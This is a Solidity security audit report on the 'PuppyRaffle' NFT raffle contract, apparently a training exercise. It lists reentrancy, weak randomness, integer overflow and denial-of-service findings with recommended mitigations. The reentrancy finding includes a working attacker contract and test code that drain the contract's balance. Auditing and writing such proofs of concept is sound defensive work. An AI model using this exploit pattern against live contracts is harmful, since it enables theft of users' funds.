---
title: Protocol Audit Report
author: Nitish kumar
date: 31 jan,2024
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.5\textwidth]{logo.pdf} 
    \end{figure}
    \vspace*{2cm}
    {\Huge\bfseries puppyRaffle Audit Report\par}
    \vspace{1cm}
    {\Large Version 1.0\par}
    \vspace{2cm}
    {\Large\itshape Cyfrin.io\par}
    \vfill
    {\large \today\par}
\end{titlepage}

\maketitle

<!-- Your report starts here! -->

Lead Auditors: 
- Nitish kumar {LinkedIn- https://www.linkedin.com/in/nitish-kumar-smart-contract-auditor-3a322a232/}

# Table of Contents
- [Table of Contents](#table-of-contents)
- [Protocol Summary](#protocol-summary)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Scope](#scope)
  - [Roles](#roles)
- [Executive Summary](#executive-summary)
  - [Issues found](#issues-found)
- [Findings](#findings)
- [High](#high)
- [Medium](#medium)
- [Low](#low)
- [Informational](#informational)
- [Gas](#gas)

# Protocol Summary

This project is to enter a raffle to win a cute dog NFT. The protocol should do the following:

1. Call the `enterRaffle` function with the following parameters:
   1. `address[] participants`: A list of addresses that enter. You can use this to enter yourself multiple times, or yourself and a group of your friends.
2. Duplicate addresses are not allowed
3. Users are allowed to get a refund of their ticket & `value` if they call the `refund` function
4. Every X seconds, the raffle will be able to draw a winner and be minted a random puppy
5. The owner of the protocol will set a feeAddress to take a cut of the `value`, and the rest of the funds will be sent to the winner of the puppy.


# Disclaimer

The YOUR_NAME_HERE team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.

# Audit Details 

- Commit Hash: e30d199697bbc822b646d76533b66b7d529b8ef5
- In Scope:



## Scope 

```
./src/
#-- PuppyRaffle.sol
```

## Roles

Owner - Deployer of the protocol, has the power to change the wallet address to which fees are sent through the `changeFeeAddress` function.
Player - Participant of the raffle, has the power to enter the raffle with the `enterRaffle` function and refund value through `refund` function.


# Executive Summary
I LOVED auditing this codebase.

## Issues found
| Severity | Number of issues found |
| -------- | ---------------------- |
| High     | 3                      |
| Medium   | 2                      |
| Low      | 1                      |
| Info     | 6                      |
| Total    | 12                     |

# Findings

## HIGH

### [H-1] Reentrancy attack in `puppyRaffle:: refund` allow  entrant to  drain  contract or raffle balance 


**Description** The `puppyRaffle:: refund` function  does not  follow [CEI(check,Effects,Interaction)] and as  a result ,enables participants to drain the contract balance.

In the `puppyRaffle:: refund` function we first make an external call to `msg.sender ` address and only after making that external call to do we updtae the `puppyRaffle::players` array.

```javascript
             function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];    
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");


@>       payable(msg.sender).sendValue(entranceFee);
@>       players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }

```

A player who has entered  the raffle could have `fallback`/`receive` function that calls the `puppyRaffle::refund` function again and claim another refund . They could continue the cycle till contract balance is drained




**Impact:** All fees paid by Raffle entrants could be stolen by the malicious participant.





**Proof of Concept:** 
1. Users enters the raffle.
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`.
3. Attacker enters the raffle
4. Attacker calls `PuppyRaffle::refund` from their contract, draining the contract balance.

**proof of Code**

<details>
<summary>Code</summary>

place the following into `puppyRaffleTest.t.sol`

```javascript
        function test_reentrancyRefund() public{
          address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract  = new ReentrancyAttacker(puppyRaffle);
        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser,1 ether);

        uint256 startingAttackContractBalance = address(attackerContract).balance;
        uint256 startingContractBalance = address(puppyRaffle).balance;

        //attack 
        vm.prank(attackUser);
        attackerContract.attack{value: entranceFee}();
        console.log("starting attacker contract balance",startingAttackContractBalance);
        console.log("staring contract balance", startingContractBalance);
        console.log("ending attacker contract balance", address(attackerContract).balance);
        console.log ("ending contract balance", address(puppyRaffle).balance);
      

    }

}


```
And this contract as well

```javascript
        contract ReentrancyAttacker{
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();

    }

    function attack() external payable{
        address[] memory players = new address[](1);
        players[0] =address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee){
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable{
        _stealMoney();
    }

    receive() external payable{
        _stealMoney();
    }
}
```

</details>




**Recommended Mitigation:**  To fix this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well.

```diff
        function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        (bool success,) = msg.sender.call{value: entranceFee}("");
        require(success, "PuppyRaffle: Failed to refund player");
-        players[playerIndex] = address(0);
-        emit RaffleRefunded(playerAddress);
    }
```


### [H-2]   Weak randomness in `puppyRaffle::selectwinner` allows user to influence or predict the winner and influence or predict the winning puppy


**Description**  HAsing `msg.sender`, `block.timestamp` and `block.difficulty` together creats a predictable find number. A predictable number is not a ggod random number.
 Malicious users can manipulate these values or know them ahead of time to choose the winner of the raffle themselvles.



*Note:* THis additionally means users could front-run this function and call `refund` if they see they are not the winner.


**Impact**  Any user can influence the winner of the raffle, winning the money and selecting the `rarest` puppy. Making the  entire  raffle  worthless  if  it become a gas war as to who wins  the raffles.

**proof of concept**

1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use that to predict when/how  to participates.
2.  user can mine/manipulate their `msg.sender` value to result in thier address being used to generated the winner!
3. Users can revert thier `selectWinner` transaction if they don not like the winner or resulting puppy. 

**Recommended Mitigation**  Consider using a cryptographically   provable random number generator such as Chainlink VRF.


### [H-3]  Integer overflow of `puppyRaffle::totalFees` loses fees

**Description:** IN solidity version prior to `0.8.0` integers were subject to integer overflows.

```javascript
uint64 myVar = type(uint64).max
// 18446744073709551615
myVar = myVar + 1
// myVar will be  0
```

**Impact:** In `puppyRaffle::selectWinner`,`totalFees`  are  accumulated  for the `feeAddress`  to collect  later  in `puppyRaffle::withdrawFees`. However , if the ` totalFees` variable overflow , the `fessAddress` may not  collect  the  corect amount   of fees, leaving  fees  permanenetly  stuck  in the  contract .

**proof of concept**

1. We  conclude a raffle of 4 players
2. we then have 89 players enter a new raffle , and conclude the  raffle 
3. `totalFees` will  be: 
```javascript
totalFees = totalFees + uint64(fee);

totalFees = 8000000000000000000 + 178000000000000000000
//and this will  overflow!
totalFees = 153255926290448384
```

4.you will not be able to  withdraw, due to the line  in `puppyRaffle::withdrawFees`:

```javascript
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

Althought you  could  use `selfdestruct` to send  ETh  to this  contract in order  for the  values  to match  withdraw the fees, this is clearly not the  intended design  of the protocol.At some point, there will be too  much `balance `  in the  contract  that  the  above `require` will be impossible to  hit

<details>
<summary> POC </summary>

```javascript
 function testTotalFeesOverflow() public playersEntered {
        // We finish a raffle of 4 to collect some fees
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 startingTotalFees = puppyRaffle.totalFees();
        // startingTotalFees = 800000000000000000

        // We then have 89 players enter a new raffle
        uint256 playersNum = 89;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        // We end the raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // And here is where the issue occurs
        // We will now have fewer fees even though we just finished a second raffle
        puppyRaffle.selectWinner();

        uint256 endingTotalFees = puppyRaffle.totalFees();
        console.log("ending total fees", endingTotalFees);
        assert(endingTotalFees < startingTotalFees);

        // We are also unable to withdraw any fees because of the require check
        vm.prank(puppyRaffle.feeAddress());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
```

</details>


**Recommended Mitigation:** There are a few possible mitigations.

1. Use a  newer version  of  solidity, and a `uint256` instead of ` uint64` for `puppyRaffle::totalFees`
2. you could also use the `safeMath` library of  a openZepplin for version 0.7.6 of solidity, however you  would still  have a  hard time with the `uint64` type if  too  many  fees are colloected.
3.Remove the balance check from`puppyRaffle::withdrwaFees`

```diff
- require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

There are mopre attack vector with that final  require ,so we recommended removing  it  regardless.

## MEDIUM

### [M-1] Looping through  players  array  to check duplicates in `puppyFaffle::enterRaffle` is  a potential  DOS(denial of service  attack ),  increementing  gas  costs for  future entrants 

IMPACT: MEDIUM

LIKEHOOD: MEDIUM

**Description** The `puppyFaffle::enterRaffle` function  loops through the 'players' array  to check for duplicates. however , the longer the `puppyFaffle::players` array is more checks a new players will have to make . This means the gas costs for  players  who enter  right when the raffle starts  will be  dramatically  lower  than those   who enter later.
every additional address in the `players` array ,is an  additional  check the loop will have to make .

```javscript
     
        //@Audit DOS attack
      @>  for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```    



**Impact:** The gas coast for raffle entrants will greatle increase  as more  players  enter the raffle . discouraging  latter  users from entering  and causing a rush at the start of a raafle to be  one of the  first entrants in the  queue.

An attacker  might make  the 'puppyRAffle::entrants' aaray  so big, that  no one else enters,gaurenteeing themeselves the win.


**Proof of Concept:** 

If we have 2 sets of 100 palyers enter, the gas coast will be as such:
-1st 100 players: ~6252048 gas
-2nd 100 players: ~18068138 gas 

This is more than 3x more expensive  for the second 100 players.

    
<details>
<summary>poC</summary>
place the  following  test into 'puppyRaffleTest.t.sol'.

```javascript

       function test_denialofService() public {
       vm.txGasPrice(1);

       //lets enter 100 players in raffle 

       uint256 playersNum = 100;
       address[] memory players = new address[](playersNum);
       for(uint256 i = 0; i<playersNum; i++){
        players[i] = address(i);
       }

       //see how much gat it costs 

       uint256 gasStart = gasleft();
       puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
       uint256 gasEnd =gasleft();

       uint256 gasUsedFirst = (gasStart - gasEnd)* tx.gasprice;
       console.log("Gas cost of the first 100 players",gasUsedFirst);


       // now for the 2 nd 100 players
      
       address[] memory playersTwo = new address[](playersNum);
       for(uint256 i = 0; i<playersNum; i++){
        playersTwo[i] = address(i + playersNum );
       }

       //see how much gat it costs 

       uint256 gasStartSecond = gasleft();
       puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
       uint256 gasEndSecond =gasleft();

       uint256 gasUsedSecond = (gasStartSecond - gasEndSecond)* tx.gasprice;
       console.log("Gas cost of the second 100 players",gasUsedSecond);

       assert(gasUsedFirst  < gasUsedSecond);
    }

```



</details>




**Recommended Mitigation:** There are a few recomendations.

1.  Consider allowing duplicates.Users can make  new wallet  address  anyways, so a  duplicate check doesnot  prevent  the same  person from enterning  multiple times , only the  same wallet address

2. consider using a mapping  to  check for duplicates. This would allow constant time lookup of whether a user has already  entered.


```diff
+          mapping(address => uint256) public addressToRaffleId;
+         uint256 public raffleId = 0;
      .
      .
      .
        function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+                 addressToRaffleId[newPlayers[i]] = raffleId;            
        }

-           // Check for duplicates
+            // Check for duplicates only from the new players
+          for (uint256 i = 0; i < newPlayers.length; i++) {
+              require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+            }    
-             for (uint256 i = 0; i < players.length; i++) {
-                 for (uint256 j = i + 1; j < players.length; j++) {
-                     require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-               }
-             }
        emit RaffleEnter(newPlayers);
      }
      .
      .
      .
           function selectWinner() external {
+            raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```

### [M-2] Smart contract wallets raffle winners without a `receive` or a `fallback` function will block the start of a new contest

**Description** The `PuppyRaffle::selectWinner` function is responsible for resetting the lottery. However, if the winner is a smart contract wallet that rejects payment, the lottery would not be able to restart.

Non-smart contract wallet users could reenter, but it might cost them a lot of gas due to the duplicate check.

**Impact:** The `PuppyRaffle::selectWinner` function could revert many times, and make it very difficult to reset the lottery, preventing a new one from starting.

Also, true winners would not be able to get paid out, and someone else would win their money!

**Proof of Concept:**

1. 10 smart contract wallets enter the lottery without a fallback or receive function.
2. The lottery ends
3. The `selectWinner` function wouldn't work, even though the lottery is over!


**Recommended Mitigation:** There are a few options to mitigate this issue.

1. Do not allow smart contract wallet entrants (not recommended)
2. Create a mapping of addresses -> payout amounts so winners can pull their funds out themselves with a new `claimPrize` function, putting the owness on the winner to claim their prize. (Recommended)




## Low


### [L-1] `puppyRaffle::getActivePlayerIndex` returns 0 for non-existent players and  for  players  at index  0,causing  a palyer at index  0 to  incorrectly think they have  not entered the raffle 


**Description** if a player is in the `puppyRaffle::players` array at index 0, this will return 0, but according to the natspec ,it will also return 0 if the player is not in the array. 



```javascript
            function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
       
        return 0;
    }

```

**Impact**  A palyer at index  0 may  incorrectly think they have  not entered the raffle ,and attempt to  enter  the raffle  again ,wasting gas.

**Proof of Concept**
1. user enters the raffle , they are the first entrant
2. `puppyRaffle::getactivePlayerIndex` returns 0
3. user thinks they have not entered correctly due to the function  documentation.

**Recommended Mitigation** The easiest recommendation would be to revert if the player is not in the array insted of returning 0.

## Gas

### [G-1] Unchanged state variables should be declared constant  or  immutable.

Reading from storage is much more expensive than reading from a constant immutable variable .

Instances:
-`puppyRaffle::raffleDuration` should be  `immutable`
-`puppyRaffle::commonImageUri` should be  `constant`
-`puppyRaffle::rareImageUri` should be  `constant`
-`puppyRaffle::legendaryImageUri` should be  `constant`


### [G-2] storage variable in a loop should be  cached 


Everytime you call `players.length` you  read from  storage , as  opposed to  memory which  is more  gas  efficient .
 
```diff
+         uint256 playerLength = players.length;
-          for (uint256 i = 0; i < players.length - 1; i++) {
+          for (uint256 i = 0; i < players.length - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
+            for (uint256 j = i + 1; j < players.length; j++) {
               require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```

## Informational/Non-crits

### [I-1]: Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

- Found in src/PuppyRaffle.sol: 32:23:35

	```solidity
	pragma solidity ^0.7.6;
	```


### [I-2] Using outdated version of solidity is not  recommened


solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

**Recommendation**
Deploy with any of the following Solidity versions:

`0.8.18`
The recommendations take into account:

 -Risks related to recent releases
 -Risks of complex code generation changes
 -Risks of new language features
 -Risks of known bugs
Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

please see [slither](https://github.com/crytic/slither/wiki/Detector-Documentation#different-pragma-directives-are-used)  documentation  for more  information .



### [I-3]: Missing checks for `address(0)` when assigning values to address state variables

Assigning values to address state variables without checking for `address(0)`.

- Found in src/PuppyRaffle.sol [Line: 62](src/PuppyRaffle.sol#L62)

	```solidity
	        feeAddress = _feeAddress;
	```

- Found in src/PuppyRaffle.sol [Line: 150](src/PuppyRaffle.sol#L150)

	```solidity
	        previousWinner = winner;
	```

- Found in src/PuppyRaffle.sol [Line: 168](src/PuppyRaffle.sol#L168)

	```solidity
	        feeAddress = newFeeAddress;
	```


### [I-4] `puppyRaffle::selectWinner` does not follow CEI which  is not a best practice

it is best to keep code clean and follow CEI (Checks, Effects,Interaction).

```diff
-   (bool success,) = winner.call{value: prizePool}("");
-        require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
+          (bool success,) = winner.call{value: prizePool}("");
+        require(success, "PuppyRaffle: Failed to send prize pool to winner");
    }
```


### [I-5] USe of ` magic` number is discouraged

it can be confusing to see number literals in a codebase , and it is much more readable if  the numbers are given a name.


**Description:** All number literals should be replaced with constants. This makes the code more readable and easier to maintain. Numbers without context are called "magic numbers".

**Recommended Mitigation:** Replace all magic numbers with constants.

```diff
+       uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
+       uint256 public constant FEE_PERCENTAGE = 20;
+       uint256 public constant TOTAL_PERCENTAGE = 100;
.
.
.
-        uint256 prizePool = (totalAmountCollected * 80) / 100;
-        uint256 fee = (totalAmountCollected * 20) / 100;
         uint256 prizePool = (totalAmountCollected * PRIZE_POOL_PERCENTAGE) / TOTAL_PERCENTAGE;
         uint256 fee = (totalAmountCollected * FEE_PERCENTAGE) / TOTAL_PERCENTAGE;
```


### [I-6] Test Coverage
Description: The test coverage of the tests are below 90%. This often means that there are parts of the code that are not tested.

```diff
| File                               | % Lines        | % Statements   | % Branches     | % Funcs       |
| ---------------------------------- | -------------- | -------------- | -------------- | ------------- |
| script/DeployPuppyRaffle.sol       | 0.00% (0/3)    | 0.00% (0/4)    | 100.00% (0/0)  | 0.00% (0/1)   |
| src/PuppyRaffle.sol                | 82.46% (47/57) | 83.75% (67/80) | 66.67% (20/30) | 77.78% (7/9)  |
| test/auditTests/ProofOfCodes.t.sol | 100.00% (7/7)  | 100.00% (8/8)  | 50.00% (1/2)   | 100.00% (2/2) |
| Total                              | 80.60% (54/67) | 81.52% (75/92) | 65.62% (21/32) | 75.00% (9/12) |
```
